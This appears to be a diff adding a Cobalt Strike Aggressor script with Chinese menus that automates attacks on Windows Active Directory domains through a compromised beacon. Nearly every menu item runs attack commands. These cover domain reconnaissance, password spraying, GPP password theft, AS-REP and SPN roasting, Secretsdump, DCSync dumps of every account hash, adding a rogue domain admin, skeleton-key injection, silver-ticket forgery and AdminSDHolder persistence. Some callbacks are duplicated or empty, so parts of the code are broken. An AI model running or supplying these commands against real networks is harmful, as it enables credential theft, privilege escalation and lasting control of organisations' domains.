@@ -1,0 +1,606 @@
+menu "域渗透" {
+	menu "域内信息收集"{
+		item "查看域信息"{
+			blog($1, "-------------------------------------------------查看域信息-----------------------------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1, "Get-NetForest");
+		}
+		item "查看域信任关系" {
+			blog($1, "-----------------------------------------------查看域信任关系----------------------------------------------------------------");
+			bshell($1, 'nltest  /domain_trusts');
+		}
+		menu "查找域控"{
+			item "获取域控详细信息"{
+				blog($1, "--------------------------------------------获取域控信息-----------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetDomainController");
+			}
+			item "通过domain controllers组查询" {
+				blog($1, "--------------------------------------------通过domain controllers组查询域控---------------------------------------------------");
+				bshell($1, 'net group "domain controllers" /domain');
+			}
+			item "通过时间服务器查询"{
+				blog($1, "---------------------------------------------通过时间服务器查询域控-------------------------------------------------------------");
+				bshell($1, "net time /domain");
+			}
+			item "通过nslookup查询"{
+				blog($1, "---------------------------------------------通过nslookup查询域控-------------------------------------------------------------");
+				prompt_text("输入域名：", "xie.com", lambda({ bshell(@ids, "nslookup -qt=ns $1"); }, @ids => $1));
+			}
+			item "通过nltest查询"{
+				blog($1, "---------------------------------------------通过nltest查询域控---------------------------------------------------------------");
+				prompt_text("输入域名：", "xie.com", lambda({ bshell(@ids, "nltest /DCLIST:$1"); }, @ids => $1));
+			}
+		}
+		item "查找域管理员" {
+			blog($1, "-------------------------------------------------查找域管理员---------------------------------------------------------------------");
+			bshell($1, 'net group "domain admins" /domain');
+		}
+		item "查找企业管理员" {
+			blog($1, "------------------------------------------------查找企业管理员--------------------------------------------------------------------");
+			bshell($1, 'net group "enterprise admins" /domain');
+		}
+		menu "查询域内用户" {
+			item "查询指定域用户信息"{
+				blog($1, "---------------------------------------------查询指定域用户信息---------------------------------------------------------------");
+				prompt_text("输入要查询的域用户：", "", lambda({ bshell(@ids, "net user $1 /domain"); }, @ids => $1));
+			}
+			item "统计域内用户数量"{
+				blog($1, "---------------------------------------------统计域内用户数量-----------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetUser | select name | measure | findstr Count");
+			}
+			item "查看域内用户"{
+				blog($1, "----------------------------------------------查看域内用户-------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetUser | select name");
+			}
+			item "将域用户导出到文件"{
+				blog($1, "----------------------------------------------将域用户导出到文件--------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetUser | select name > domain_user.txt");
+				blog($1, "将域内用户详细信息导出到当前目录下的 domain_user.txt 文件中!");
+			}
+			item "将域用户详细信息导出到文件"{
+				blog($1, "---------------------------------------------将域用户详细信息导出到文件--------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetUser > domain_user_info.txt");
+				blog($1, "将域内用户导出到当前目录下的 domain_user_info.txt 文件中!");
+			}
+			item "查询指定域用户在哪些域组中"{
+				blog($1, "---------------------------------------------查询指定域用户在哪些域组中-------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				prompt_text("输入要查询的域用户：", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
+			}
+		}
+		menu "查询域内主机"{
+			item "统计域内主机数量"{
+				blog($1, "---------------------------------------------统计域内主机数量----------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetComputer | measure | findstr Count");
+			}
+			item "查看域内主机"{
+				blog($1, "---------------------------------------------查看域内主机-------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetComputer");
+			}
+			item "将域主机导出到文件"{
+				blog($1, "--------------------------------------------将域主机导出到文件---------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetComputer > domain_computer.txt");
+				blog($1, "将域内主机导出到当前目录下的 domain_computer.txt 文件中!");
+			}
+			item "查询带指定字符的主机"{
+				blog($1, "--------------------------------------------查询带指定字符的主机--------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				prompt_text("输入要查询的字符：", "admin", lambda({ bpowerpick(@ids, "Get-NetComputer \*$1\*"); }, @ids => $1));
+			}
+		}
+		menu "查询域内的组"{
+			item "查询域内的组名(所有组)"{
+				blog($1, "--------------------------------------------查询域内的组名(所有组)-----------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetGroup");
+			}
+			item "查询域内的组名(全局组、通用组)"{
+				blog($1, "---------------------------------------------查询域内的组名(全局组、通用组)----------------------------------------------------");
+				bshell($1, "net group /domain");
+			}
+			item "将域组导出到文件"{
+				blog($1, "---------------------------------------------将域组导出到文件----------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetGroup > domain_group.txt");
+				blog($1, "将域内的组导出到当前目录下的 domain_group.txt 文件中!");
+			}
+			item "查询带指定字符的域组"{
+				blog($1, "---------------------------------------------查询带指定字符的域组-------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				prompt_text("输入要查询的字符：", "admin", lambda({ bpowerpick(@ids, "Get-NetGroup \*$1\*"); }, @ids => $1));
+			}
+			item "查询指定域用户在哪些域组中"{
+				blog($1, "---------------------------------------------查询指定域用户在哪些域组中--------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				prompt_text("输入要查询的域用户：", "", lambda({ bpowerpick(@ids, "Get-NetGroup -UserName $1"); }, @ids => $1));
+			}
+			item "查询指定组内含有哪些用户"{
+				blog($1, "-------------------------------------------查询指定域用户在哪些域组中--------------------------------------------------------");
+				prompt_text("输入要查询的组名：", "domain admins", lambda({ bpowerpick(@ids, "net group \"$1\" /domain"); }, @ids => $1));
+			}
+		}
+		item "查询域内所有组策略对象"{
+			blog($1, "---------------------------------------------查询域内所有组策略对象-----------------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1, "Get-NetGPO");
+		}
+		item "查询域内的OU组织单位"{
+				blog($1, "---------------------------------------------查询域内的OU组织单位------------------------------------------------------------");
+				bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+				bpowerpick($1, "Get-NetOU");
+		}
+		item "查询工作站配置" {
+			blog($1, "-------------------------------------------------查询工作站配置------------------------------------------------------------------");
+			bshell($1, "net config workstation");
+		}
+		item "查看有几个域" {
+			blog($1, "-------------------------------------------------查看有几个域--------------------------------------------------------------------");
+			bshell($1, "net view /domain");
+		}
+		item "查询域密码策略" {
+			blog($1, "-------------------------------------------------查询域密码策略-----------------------------------------------------------------");
+			bshell($1, "net accounts /domain");
+		}
+		item "查询用户SID和域SID" {
+			blog($1, "-------------------------------------------------查询用户SID和域SID-------------------------------------------------------------");
+			blog($1, "如用户的SID是：S-1-5-21-2189311154-2766837956-1982445477-520 则域SID则是去掉最后的520：S-1-5-21-2189311154-2766837956-1982445477");
+			bshell($1, "whoami /user");
+		}
+		item "查询当前域使用的文件服务器"{
+			blog($1, "-------------------------------------------------查询当前域使用的文件服务器------------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1, "Get-NetFileServer");
+		}
+	}
+	menu "dsquery查询(域控)" {
+		item "查询主域控" {
+			blog($1, "-------------------------------------------查询主域控-------------------------------------------------------------------");
+			bshell($1, "netdom query pdc");
+		}
+		item "查询域控DN" {
+			blog($1, "-------------------------------------------------查询域控DN------------------------------------------------------------------");
+			bshell($1, "dsquery server");
+		}
+		item "查询域用户DN" {
+			blog($1, "-------------------------------------------------查询域用户DN----------------------------------------------------------------");
+			bshell($1, "dsquery user");
+		}
+		item "查询域主机DN" {
+			blog($1, "--------------------------------------------查询域主机DN-----------------------------------------------------------------");
+			bshell($1, "dsquery computer");
+		}
+		item "查询域组DN" {
+			blog($1, "-------------------------------------------查询域组DN-------------------------------------------------------------------");
+			bshell($1, "dsquery group");
+		}
+		item "查询组织单位DN" {
+			blog($1, "--------------------------------------------查询组织单位DN---------------------------------------------------------------");
+			bshell($1, "dsquery ou");
+		}
+		item "查询站点DN" {
+			blog($1, "------------------------------------------------查询站点DN-------------------------------------------------------------------");
+			bshell($1, "dsquery site");
+		}
+		item "查询分区DN" {
+			blog($1, "------------------------------------------查询分区DN-------------------------------------------------------------------");
+			bshell($1, "dsquery partition");
+		}
+	}
+	menu "定位域用户或域主机"{
+		menu "PVEFindADUser"{
+			item "查询域中所有主机当前的登录用户"{
+				blog($1, "---------------------------------------------查询域中所有主机当前的登录用户-------------------------------------");
+				bexecute_assembly($1, script_resource("/exe/PVEFindADUser.exe"),"-current");
+			}
+			item "查询指定用户当前登录的主机"{
+				blog($1, "--------------------------------------------查询指定用户当前登录的主机------------------------------------------");
+				prompt_text("输入指定用户：", "xie\\administrator", lambda({ bexecute_assembly(@ids, script_resource("/exe/PVEFindADUser.exe"),"-current $1"); }, @ids => $1));
+			}
+			item "查询指定主机当前登录的用户"{
+				blog($1, "-------------------------------------------查询指定主机当前登录的用户-------------------------------------------");
+				prompt_text("输入指定主机：", "win7", lambda({ bexecute_assembly(@ids, script_resource("/exe/PVEFindADUser.exe"),"-current -target $1"); }, @ids => $1));
+			}
+		}
+		menu "Psloggedon"{
+			item "上传Psloggedon"{
+				$bid = $1;
+		        $dialog = dialog("上传Psloggedon.exe", %(UploadPath => "", bid => $bid), &upload_Psloggedon);
+		        drow_text($dialog, "UploadPath",  "上传路径: ");    
+		        dbutton_action($dialog, "上传");
+		        dialog_show($dialog);
+			}
+		 	sub upload_Psloggedon{
+				bupload($bid, script_resource("/exe/Psloggedon.exe"));
+			}
+			menu "探测"{
+				item "查询本地登录的用户"{
+					blog($1, "----------------------------------------查询本地登录的用户--------------------------------------------------------");
+					bshell($1, "Psloggedon.exe -l");
+				}
+				item "查询指定用户当前登录的主机"{
+					blog($1, "-----------------------------------------查询指定用户当前登录的主机-----------------------------------------------");
+					prompt_text("输入指定用户：", "administrator", lambda({ bshell(@ids, "Psloggedon.exe $1"); }, @ids => $1));
+				}
+				item "查询指定主机当前登录的用户"{
+					blog($1, "-----------------------------------------查询指定主机当前登录的用户-----------------------------------------------");
+					prompt_text("输入指定主机：", "win7", lambda({ bshell(@ids, "Psloggedon.exe \\\\$1"); }, @ids => $1));
+				}
+			}
+		 	item "删除Psloggedon"{
+		 		blog($1, "---------------------------------------------删除Psloggedon.exe--------------------------------------------------");
+		        bshell($1, "del /f /s /q Psloggedon.exe");
+		 	}
+		}
+		menu "PowerView(域管)"{
+			item "查询指定用户当前登录的主机"{
+				blog($1, "-----------------------------------------查询指定用户当前登录的主机-----------------------------------------------");
+				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
+				prompt_text("输入指定用户：", "administrator", lambda({ bpowerpick(@ids,"Invoke-UserHunter -UserName \"$1\"");}, @ids => $1));
+			}
+			item "查询指定主机当前登录的用户"{
+				blog($1, "-----------------------------------------查询指定主机当前登录的用户-----------------------------------------------");
+				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
+				prompt_text("输入指定主机：", "win7", lambda({ bpowerpick(@ids,"Invoke-UserHunter -ComputerName \"$1\"");}, @ids => $1));
+			}
+		}
+	}
+	item "查询域内DNS记录"{
+        $bid = $1['@'];
+        $Dialog = dialog("查询域内DNS记录",%(domain => "xie.com",bid => $bid),&query_dns);
+        dialog_description($Dialog, "查询域内的DNS记录");
+        drow_text($Dialog, "domain", "域名: ");
+        dbutton_action($Dialog, "确定");
+        dialog_show($Dialog);
+	}
+	sub query_dns{
+		blog($bid, "---------------------------------------------------查询域内DNS记录------------------------------------------------------------");
+		bpowershell_import($bid, script_resource("./powershell/PowerView.ps1"));
+		bpowerpick($bid, "Get-DNSRecord  -ZoneName $3['domain'] | select name,data");
+		bpowerpick($bid, "Get-DNSRecord  -ZoneName $3['domain'] | select name,data > dns.txt");
+	}
+	item "获取GPP组策略凭据" {
+		blog($1, "--------------------------------------------------获取GPP组策略凭据------------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/Net-GPPPassword.exe'));
+	}
+	item "密码喷洒"{
+		blog($1, "--------------------------------------------密码喷洒------------------------------------------------------------");
+		blog($1, "该功能仅限于当前主机在域内");
+		bpowershell_import($1, script_resource("./powershell/DomainPasswordSpray.ps1"));
+		prompt_text("输入喷洒的密码：", "P@ss123", lambda({ bpowerpick(@ids,"Invoke-DomainPasswordSpray -Password $1");}, @ids => $1));
+	}
+	menu "AS-REP Roasting攻击"{
+		item "枚举不需要kerberos预身份验证的用户"{
+			blog($1, "--------------------------------------------枚举不需要kerberos预身份验证的用户---------------------------------------------");
+			blog($1, "该功能仅限于当前主机在域内");
+			bpowershell_import($1, script_resource("./powershell/powerview2.ps1"));
+			bpowerpick($1, "Get-DomainUser -PreauthNotRequired | select name");
+		}
+		item "获取AS-REP返回的Hash"{
+			blog($1, "--------------------------------------------获取AS-REP返回的Hash-------------------------------------------------------");
+			blog($1, "该功能仅限于当前主机在域内");
+			$bid = $1;
+			$dialog = dialog("获取AS-REP返回的Hash", %(user => "hack2", domain => "xie.com", bid => $bid), &get_hash);
+			drow_text($dialog, "user",  "用户名: ");
+			drow_text($dialog, "domain",  "域: ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub get_hash{
+			bpowershell_import($bid, script_resource("./powershell/ASREPRoast.ps1"));
+			bpowerpick($bid, "Get-ASREPHash -UserName $3['user'] -Domain $3['domain']");
+		}
+	}
+	menu "SPN"{
+		item "扫描域中所有的SPN信息"{
+			blog($1, "----------------------------------扫描域中所有的SPN信息---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/Discover-PSInterestingServices.ps1"));
+			bpowerpick($1,"Discover-PSInterestingServices");
+		}
+		item "扫描Exchange服务SPN"{
+			blog($1, "----------------------------------扫描Exchange服务SPN---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/Discover-PSMSExchangeServers.ps1"));
+			bpowerpick($1,"Discover-PSMSExchangeServers");
+		}
+		item "扫描SQLServer服务SPN"{
+			blog($1, "----------------------------------扫描SQLServer服务SPN---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/Discover-PSMSSQLServers.ps1"));
+			bpowerpick($1,"Discover-PSMSSQLServers");
+		}
+		item "查询域内用户注册的SPN"{
+			blog($1, "----------------------------------查询域内用户注册的SPN---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/GetUserSPNs.ps1"));
+			bpowerpick($1,"");
+		}
+		item "查询域内用户注册的SPN(详细)"{
+			blog($1, "----------------------------------查询域内用户注册的SPN---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1,"Get-NetUser -SPN");
+		}
+		item "查询域SPN"{
+			blog($1, "----------------------------------查询域SPN---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/Get-DomainSpn.psm1"));
+			bpowerpick($1,"Get-DomainSpn");
+		}
+		item "枚举弱服务SPN票据"{
+			blog($1, "----------------------------------枚举弱服务SPN票据---------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/Find-PotentiallyCrackableAccounts.ps1"));
+			bpowerpick($1,"Find-PotentiallyCrackableAccounts -FullData -Verbose");
+		}
+	}
+	item "Secretsdump哈希"{
+		blog($1, "----------------------------------Secretsdump哈希---------------------------------------------------");
+		bupload($1, script_resource("/exe/Secretsdump.exe"));
+		$bid = $1;
+		$dialog = dialog("Secretsdump哈希", %(host => "10.211.55.5", user => "administrator", pass => "P@ss123", dn => "xie.com", bid => $bid), &Secretsdump);
+		drow_text($dialog, "host",  "域控ip: ");
+		drow_text($dialog, "user",  "用户名: ");
+		drow_text($dialog, "pass",  "密码: ");
+		drow_text($dialog, "dn",    "域DN: ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	sub Secretsdump{
+		brun($bid, "Secretsdump.exe -target=$3['host'] -u=$3['user'] -p=$3['pass'] -d=$3['dn']");
+	}
+	menu "Exchange"{
+		item "探测Exchange服务器是否存在CVE-2020-0688"{
+			blog($1, "---------------------------------------------探测Exchange服务器是否存在CVE-2020-0688漏洞------------------------------------------");
+			$bid = $1;
+			$dialog = dialog("CVE-2020-0688", %(host => "10.211.55.5", user => "xie\\hack", pass => "P@ss123", bid => $bid), &scaner_cve20200688);
+			drow_text($dialog, "host",  "Exchange服务器ip: ");
+			drow_text($dialog, "user",  "用户名: ");
+			drow_text($dialog, "pass",  "密码: ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub scaner_cve20200688{
+			bexecute_assembly($bid, script_resource('/exe/ExchangeDetect.exe'), $3['host']." ".$3['user']." ".$3['pass']);
+		}
+		item "Exchange Server writeACL Dcsync导出域哈希"{
+			blog($1, "-----------------------------------------Exchange Server writeACL Dcsync导出域哈希-----------------------------------------------");
+			$bid = $1;
+			$dialog = dialog("Exchange Server writeACL Dcsync导出域哈希", %(dn => "DC=xie,DC=com", user => "hack", bid => $bid), &writeacl);
+			drow_text($dialog, "dn",  "输入域的DN: ");
+			drow_text($dialog, "user",  "用户名: ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub writeacl{
+			bpowershell_import($bid, script_resource("/powershell/powerview2.ps1"));
+			bpowerpick($bid,"Add-DomainObjectAcl -TargetIdentity \'$3['dn']\' -PrincipalIde $3['user'] -Rights DCSync -Verbose");
+		}
+	}
+	menu "ACL访问控制列表"{
+		menu "icacls工具"{
+			item "查看指定文件ACL"{
+				blog($1, "--------------------------------------------------查看指定文件ACL------------------------------------------------------------");
+				prompt_text("输入文件路径：", "C:\\Windows\\System32\\config\\sam", lambda({ bshell(@ids, "icacls $1"); }, @ids => $1));
+			}
+			item "添加用户对指定文件/文件夹的完全访问权限"{
+				$bid = $1;	
+				$dialog = dialog("对话框",%(bid => $bid),&add_useracl);
+				dialog_description($dialog, "添加用户对指定文件/文件夹(包括当前目录及其子目录中的文件)的完全访问权限"); 
+				drow_text($dialog, "user", "用户名:");
+				drow_text($dialog, "path", "文件路径:");
+				dbutton_action($dialog, "确定");
+				dialog_show($dialog);
+			}
+			sub add_useracl{
+				blog($bid, "-------------------------------------------添加用户对指定文件/文件夹(包括当前目录及其子目录中的文件)的完全访问权限----------------------");
+				bshell($bid,"icacls $3['path'] /grant $3['user']\:\(OI\)\(CI\)\(F\) /t");
+			}
+			item "移除用户对指定文件/文件夹的完全访问权限"{
+				$bid = $1;	
+				$dialog = dialog("对话框",%(bid => $bid),&add_useracl);
+				dialog_description($dialog, "移除用户对指定文件/文件夹(包括当前目录及其子目录中的文件)的完全访问权限"); 
+				drow_text($dialog, "user", "用户名:");
+				drow_text($dialog, "path", "文件路径:");
+				dbutton_action($dialog, "确定");
+				dialog_show($dialog);
+			}
+			sub add_useracl{
+				blog($bid, "-------------------------------------------添加用户对指定文件/文件夹(包括当前目录及其子目录中的文件)的完全访问权限----------------------");
+				bshell($bid,"icacls $3['path'] /remove $3['user'] /t");
+			}
+		}
+		item "获得指定用户的ACL"{
+			blog($1, "--------------------------------------获得指定用户的ACL----------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/powerview2.ps1"));
+			prompt_text("输入用户名：", "", lambda({ bpowerpick(@ids,"Get-DomainUser $1");}, @ids => $1));
+		}
+		item "添加用户对对象的完全访问权限"{
+			$bid = $1;
+			$dialog = dialog("对话框", %(bid => $bid), &add_acl);
+			dialog_description($dialog, "添加用户对对象的完全访问权限");
+			drow_text($dialog, "username",  "用户名: ");
+			drow_text($dialog, "guid",  "对象GUID: ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub add_acl{
+			blog($bid, "--------------------------------------添加用户对对象的完全访问权限----------------------------------------------------");
+			bpowershell_import($bid, script_resource("./powershell/powerview2.ps1"));
+			bpowerpick($bid,"Add-DomainObjectAcl -TargetIdentity \'$3['guid']\' -PrincipalIdentity $3['username'] -Rights All")
+		}
+		item "移除用户对对象的完全访问权限"{
+			$bid = $1;
+			$dialog = dialog("对话框", %(bid => $bid), &remove_acl);
+			dialog_description($dialog, "移除用户对对象的完全访问权限");
+			drow_text($dialog, "username",  "用户名: ");
+			drow_text($dialog, "guid",  "对象GUID: ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub remove_acl{
+			blog($bid, "--------------------------------------移除用户对对象的完全访问权限----------------------------------------------------");
+			bpowershell_import($bid, script_resource("./powershell/powerview2.ps1"));
+			bpowerpick($bid,"Remove-DomainObjectAcl -TargetIdentity \'$3['guid']\' -PrincipalIdentity $3['username'] -Rights All")
+		}
+		item "枚举域内危险ACL配置"{
+			blog($1, "--------------------------------------枚举域内危险ACL配置----------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1, "Invoke-ACLScanner -ResolveGUIDs");		
+		}
+	}
+	menu "AdminSDHolder"{
+		item "枚举AdminCount值为1的用户"{
+			blog($1, "--------------------------------------枚举AdminCount值为1的用户----------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1, "Get-NetUser -Admincount | findstr distinguishedname");
+		}
+		item "枚举AdminCount值为1的组"{
+			blog($1, "---------------------------------------枚举AdminCount值为1的组-----------------------------------------------------------");
+			bpowershell_import($1, script_resource("./powershell/PowerView.ps1"));
+			bpowerpick($1, "Get-NetGroup -Admincount");
+		}
+		menu "AdminSDHolder权限维持(域管)"{
+			item "将指定用户添加到AdminSDHolder的ACL中"{
+				$bid = $1;
+				$dialog = dialog("对话框", %(bid => $bid), &add_adminsdholder_acl);
+				dialog_description($dialog, "将指定用户添加到AdminSDHolder的ACL中");
+				drow_text($dialog, "username",  "用户名: ");
+				dbutton_action($dialog, "确定");
+				dialog_show($dialog);
+			}
+			sub add_adminsdholder_acl{
+				blog($bid, "---------------------------------------将指定用户添加到AdminSDHolder的ACL中-------------------------------------------------------");
+				bpowershell_import($bid, script_resource("/powershell/PowerView.ps1"));
+				bpowerpick($bid,"Add-ObjectAcl -TargetADSprefix \"CN=AdminSDHolder, CN=System\" -PrincipalSamAccountName $3['username'] -Rights All");
+				bpowerpick($bid,"Get-ObjectAcl -ResolveGUIDs -ADSprefix \"CN=AdminSDHolder, CN=System\" | \? \{\$_.identityReference -match \"$3['username']\"\}");
+			}
+			item "手动触发SDProp的运行"{
+				blog($1, "---------------------------------------手动触发SDProp的运行----------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("/powershell/Invoke-ADSDPropagation.ps1"));
+				bpowerpick($1,"Invoke-ADSDPropagation -TaskName runProtectAdminGroupsTask");
+			}
+			item "查看指定用户是否对域管理员组具有权限"{
+				blog($1, "---------------------------------------查看指定用户是否对域管理员组具有权限------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
+				prompt_text("输入用户名：", "", lambda({ bpowerpick(@ids,"Get-ObjectAcl -ADSprefix \"CN=Domain admins,CN=Users\" -resolveguids | \? \{\$_.identityreference -match \"$1\"\}");}, @ids => $1));
+			}
+		}
+	}
+	menu "导出hash(域管)" {
+		item "导出域内指定用户hash" {
+	    	local('$bid');
+	    	blog($1, "-----------------------------------------导出域内指定用户hash-----------------------------------------------------------");
+	        foreach $bid ($1){
+	            mimikatz_bdcsync($bid);
+	        }
+		}
+		sub mimikatz_bdcsync{
+			$bid = $1;	
+			$dialog = dialog("DomainInfo" , %(beacon => $1 , domain => "XIE.COM" , user => "krbtgt") , lambda({
+				bdcsync($3["beacon"] , $3["domain"] , $3["user"])
+			}));
+			dialog_description($dialog, "使用条件：需要域管理员权限"); 
+			drow_text($dialog, "domain", "Domain:");
+			drow_text($dialog, "user", "User:");
+			dbutton_action($dialog, "Launch");
+			dialog_show($dialog);
+		}
+		item "导出域内所有用户hash" {
+			$bid = $1['@'];
+			$dialog = dialog("导出域内所有用户hash", %(domain => "xie.com",bid => $bid), &mimikatz_all);
+			dialog_description($dialog, "使用条件：需要域管理员权限");
+			drow_text($dialog, "domain", "域名:  ");
+			dbutton_action($dialog, "导出");
+			dialog_show($dialog);
+		}
+		sub mimikatz_all {
+			blog($bid, "----------------------------------------导出域内所有用户hash------------------------------------------------------------");
+			bmimikatz($bid, "lsadump::dcsync /domain:$3['domain'] /all /csv");
+		}
+	}
+    item "添加域管理员(域管)"{
+        $bid = $1['@'];
+        $Dialog = dialog("添加域管",%(username => "test",passsword => "P@ss123",bid => $bid),&add_admin_user);
+        dialog_description($Dialog, "注意下账户策略中:密码复杂度"); #介绍
+        drow_text($Dialog, "username", "username: ");
+        drow_text($Dialog, "passsword", "passsword: ");
+        dbutton_action($Dialog, "运行");
+        dialog_show($Dialog);
+    }
+    sub add_admin_user{
+    	blog($bid, "---------------------------------------------添加域管理员-------------------------------------------------------------------");
+    	local('$Name');
+    	$Name = $3['username'];
+    	$Pwd = $3['passsword'];
+    	bshell($bid, "net user $Name $Pwd /add /domain && net group \"Domain Admins\"  $Name  /add /domain ");	
+    	blog($bid, "域管理员添加成功，用户名：$Name  密码：$Pwd");			
+	}
+	menu "域控权限持久化(域管)" {
+    	item "Skeleton(万能密码)"{
+    		blog($1, "--------------------------------------------Skeleton Key万能密码--------------------------------------------------------");
+    		blog($1, "域内所有账号中添加万能密码：mimikatz");
+    		local('$bid');
+            foreach $bid ($1){
+            	mimikatz_skeleton($1);
+            }
+    	}
+	    sub mimikatz_skeleton{
+			bmimikatz($1 , "misc::skeleton");
+		}
+		item "白银票据" {
+	        $dialog = dialog("白银票据", %(user => "user" , id => "500" , domain => "domain" , sid => "sid" , target => "DC-waf.com" , rc4 => "NTLM" , service => "cifs"), &baiyin);
+	        dialog_description($dialog, "白银票据利用: 攻击者必须获得目标服务账号的密码hash值"); #介绍
+	        drow_text($dialog, "user", "伪造用户名: "); #文本
+	        drow_text($dialog, "id", "id值: "); #文本
+	        drow_text($dialog, "domain", "域名: "); #文本
+	        drow_text($dialog, "sid", "sid: "); #文本
+	        drow_text($dialog, "target", "目标主机名: "); #文本
+	        drow_text($dialog, "rc4", "hash(NTLM): "); #文本
+	        drow_text($dialog, "service", "伪造的服务: "); #文本  
+	        dbutton_action($dialog, "开始"); #按钮
+			dialog_show($dialog);
+		    local('$bid');
+		    foreach $bid ($1){
+		        $beaconid = $1;
+		    }
+		}
+		sub baiyin {
+		    $user = $3["user"];
+		    $id = $3["id"];
+		    $domain = $3["domain"];
+		    $sid = $3["sid"];
+		    $target = $3["target"];
+		    $rc4 = $3["rc4"];
+		    $service = $3["service"];
+		    bmimikatz($beaconid, "kerberos::golden /user:$user /id:$id /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /ptt exit");
+		}
+		menu "AdminSDHolder权限维持"{
+			item "将指定用户添加到AdminSDHolder的ACL中"{
+				$bid = $1;
+				$dialog = dialog("对话框", %(bid => $bid), &add_adminsdholder_acl);
+				dialog_description($dialog, "将指定用户添加到AdminSDHolder的ACL中");
+				drow_text($dialog, "username",  "用户名: ");
+				dbutton_action($dialog, "确定");
+				dialog_show($dialog);
+			}
+			sub add_adminsdholder_acl{
+				blog($bid, "---------------------------------------将指定用户添加到AdminSDHolder的ACL中-------------------------------------------------------");
+				bpowershell_import($bid, script_resource("/powershell/PowerView.ps1"));
+				bpowerpick($bid,"Add-ObjectAcl -TargetADSprefix \"CN=AdminSDHolder, CN=System\" -PrincipalSamAccountName $3['username'] -Rights All");
+				bpowerpick($bid,"Get-ObjectAcl -ResolveGUIDs -ADSprefix \"CN=AdminSDHolder, CN=System\" | \? \{\$_.identityReference -match \"$3['username']\"\}");
+			}
+			item "手动触发SDProp的运行"{
+				blog($1, "---------------------------------------手动触发SDProp的运行----------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("/powershell/Invoke-ADSDPropagation.ps1"));
+				bpowerpick($1,"Invoke-ADSDPropagation -TaskName runProtectAdminGroupsTask");
+			}
+			item "查看指定用户是否对域管理员组具有权限"{
+				blog($1, "---------------------------------------查看指定用户是否对域管理员组具有权限------------------------------------------------------------------");
+				bpowershell_import($1, script_resource("/powershell/PowerView.ps1"));
+				prompt_text("输入用户名：", "", lambda({ bpowerpick(@ids,"Get-ObjectAcl -ADSprefix \"CN=Domain admins,CN=Users\" -resolveguids | \? \{\$_.identityreference -match \"$1\"\}");}, @ids => $1));
+			}
+		}
+	}
+}
